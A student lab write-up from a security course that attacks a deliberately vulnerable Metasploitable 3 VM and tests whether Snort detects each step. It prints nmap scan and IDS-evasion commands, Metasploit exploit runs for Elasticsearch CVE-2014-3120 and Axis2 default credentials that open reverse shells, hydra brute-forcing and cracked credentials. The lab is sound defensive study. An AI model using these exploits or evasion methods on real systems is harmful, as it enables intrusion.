# Is it easier to fix the application than to detect attacks?

## Background
I carried out attacks following the 7-step approach [1], focusing particularly
on scanning (step 2), access and escalation (step 3). I configured and ran
metasploitable 3 in a VM on a Linux Mint host (IP address `192.168.1.6`),
following instructions on the course project website [2], and installed Snort 3
with rules configured from third-party instructions [3, 4]. Snort was run with
the command

`snort -A console -i1 -c c:\Snort\etc\snort.conf -l c:\Snort\log -K ascii`

## Results
Attacks were carried out using Kali Linux 18.1 in a separate VM (IP address
  `192.168.1.200`). `nmap` was used
for the scanning (attacks one and two), and the default Kali install of
`metasploit` was used for access and escalation (attacks three to five).

Attacks one, three, and four were detected by Snort. Attacks two and five were
not detected. The question of whether it is easier to fix the application or
detect attacks is addressed in the conclusion.

### Attack 1: nmap intense scan (Detected)

The first attack was an intense port scan with `nmap -T4 -p 1-65535 -A -v 192.168.1.6`.
This successfully discovered information about potentially-vulnerable services
on the Windows host (note this list is not exhaustive):

    Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-02 12:54 GMT
    Nmap scan report for 192.168.1.6

    PORT      STATE SERVICE  VERSION
    22/tcp    open  ssh      OpenSSH 7.1 (protocol 2.0)
    3000/tcp  open  http     WEBrick httpd 1.3.1 (Ruby 2.3.3 (2016-11-21))
    4848/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
    8022/tcp  open  http     Apache Tomcat/Coyote JSP engine 1.1
    8080/tcp  open  http        Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
    8282/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
    8383/tcp  open  ssl/http Apache httpd
    8484/tcp  open  http     Jetty winstone-2.8     
    8585/tcp  open  http     Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
    9200/tcp  open  http     Elasticsearch REST API 1.1.1 (name: Tarot; Lucene 4.7)
    49153/tcp open  msrpc    Microsoft Windows RPC
    49154/tcp open  msrpc    Microsoft Windows RPC

    Aggressive OS guesses: Microsoft Windows Server 2008 or 2008 Beta 3 (91%)

However, the scan was detected by Snort, with numerous `Priority 2` alerts
logged, e.g. several  

    Consecutive TCP small segments exceeding threshold [Classification: Potentially Bad Traffic] 192.168.1.200 -> 192.168.1.6

(here, `192.168.1.200` is the Kali linux VM) and several dozen

    Reset outside window [Classification: Potentially Bad Traffic] 192.168.1.200

and

    TCP session without 3-way handshake [Classification: Potentially Bad Traffic]

As a result, the intense port scan was clearly identified by Snort, and the
large number of alerts would be detected as malicious activity.

### Attack 2: nmap stealth scanning (Not Detected)

The Snort detection in the previous attack could be successfully avoided using
more careful tuning of nmap options. For example, a scan of 100 ports using
`nmap -T2 -F 192.168.1.6` completed in 150 seconds and identified services on
port 22 (ssh), and 8080 (http) without detection. `nmap -T2 -A 192.168.1.6`
took 1214 seconds to complete, and retrieved a full set of results; however, it
triggered a few Snort alerts when scanning port 8383, and might have been
detected. Even slower scanning with `-T1` specified triggered no alerts, but
took a very long time to complete.

Therefore, it appears straightforward to carry out reconnaissance and scanning
without triggering Snort if the attacker is patient, limits the scanning rate,
and carefully selects ports to be scanned.  

### Attack 3: access via Elasticsearch CVE-2014-3120 (Detected)

Running `nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV 192.168.1.6` identified numerous potential vulnerabilities. My first exploit
was against Elasticsearch, using metasploit  

    use multi/elasticsearch/script_mvel_rce
    set RHOST 192.168.1.6

this was then run with the exploit command

    msf exploit(multi/elasticsearch/script_mvel_rce) > exploit

    Started reverse TCP handler on 192.168.1.200:4444
    Trying to execute arbitrary Java...
    Discovering remote OS...
    Remote OS is 'Windows Server 2008 R2'
    Discovering TEMP path
    TEMP path identified: 'C:\Windows\TEMP\'
    Sending stage (53837 bytes) to 192.168.1.6
    Meterpreter session 2 opened (192.168.1.200:4444 -> 192.168.1.6:50615) at 2018-03-11 11:32:50 +0000

A shell could then be opened on the remote system

    meterpreter > shell
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Program Files\elasticsearch-1.1.1>

However, this exploit led to a large number of alerts in the Snort logs
originating at port 50615 (used by Meterpreter) on the Kali host, and so would
have been easily detected. The attack also left `.tmp` and `.jar` files in
`C:\Windows\Temp` directory, which would provide evidence of compromise in the
case of later forensic analysis.

### Attack 4: Default password in Apache Axis2 (Detected)

The deployed Apache Tomcat server includes CVE-2010-0219, a default password
of `axis2` for the `admin` account. This can be exploited to create a shell
with metasploit

    use exploit/multi/http/axis2_deployer
    set RHOST 192.168.1.6

then

    msf exploit(multi/http/axis2_deployer) > exploit
    Started reverse TCP handler on 192.168.1.200:4444
    http://192.168.1.6:8282/axis2/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] successful login 'admin' : 'axis2'
    Successfully uploaded
    Polling to see if the service is ready
    Sending stage (53837 bytes) to 192.168.1.6
    Meterpreter session 2 opened (192.168.1.200:4444 -> 192.168.1.6:50810) at 2018-03-11 11:48:32 +0000
    Deleted webapps/axis2/WEB-INF/services/oaPWWciG.jar

a shell could again be opened on the remote systems

    meterpreter > shell
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33>

Again, the exploit was detected by Snort, which showed a few log entries
originating on port 50810 (used by Meterpreter) on the Kali host. However, there
were far fewer entries than in attack 3, and it is possible that these might
have been overlooked on a busy system.

### Attack 5: Default password on Wordpress wp-admin (Not Detected)

I ran a few more successful metasploit attacks, but all were detected by Snort,
so for the final attack, I assumed that attack 4 (which was the 'quietest') was
not immediately detected. I opened a remote shell and ran `net users`, which
returned

    User accounts for \\METASPLOITABLE3
    ---------------------------------------------------------------------------
    Administrator     anakin_skywalker    artoo_detoo
    ben_kenobi        boba_fett           c_three_pio
    chewbacca         darth_vader         greedo
    Guest             han_solo            jabba_hutt
    jarjar_binks      kylo_ren            lando_calrissian
    sshd_server       vagrant

I was able to brute-force `c_three_pio` with `hydra` and Kali's `rockyou.txt`
wordlist

    sshpass -p pr0t0c0l ssh c_three_pio@192.168.1.6
    Last login: Sun Mar 11 16:45:46 2018 from 192.168.1.200
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Program Files\OpenSSH\home\c_three_pio>

but this would have been easily detected due to a large number of failed logins.
However, I wrote a python script to look for passwords that were the same as
the username, and managed to log in to

    http://192.168.1.6:8585/wordpress/wp-admin/

with the pair `vagrant:vagrant`. This was not detected by Snort, presumably
as it appears to be a routine login to `wp-admin`, but a wordpress administrator
might have noticed failed logins from other users. However, this was the
closest that I was able to get to an system compromise without any detection
from Snort.  

## Conclusion

While it was relatively easy to carry out scanning without detection, Snort
seemed to do a good job of detecting exploits launched from metasploit: I opened
remote shells through half a dozen different exploits, and all were detected to
some extent, so I had to 'cheat' a little and assume my username enumeration
went undetected in order to achieve an 'undetected' compromise.

However, it was very easy to compromise the system via weak passwords and
unpatched vulnerabilities in software, and while Snort detected many of these
attempts, the attack would have succeeded before an administrator could respond.
Therefore, the answer to the question is 'both'! While detecting attacks is
important, it is also essential to fix the applications to reduce the attack
surface of the system. 

### References

    [1] http://resources.infosecinstitute.com/the-seven-steps-of-a-successful-cyber-attack/
    [2] https://cybersecuritybase.github.io/project2/
    [3] https://ttcshelbyville.wordpress.com/2014/03/30/defending-your-network-with-snort-for-windows/
    [4] https://www.securityarchitecture.com/learning/intrusion-detection-systems-learning-with-snort/configuring-snort/#step1
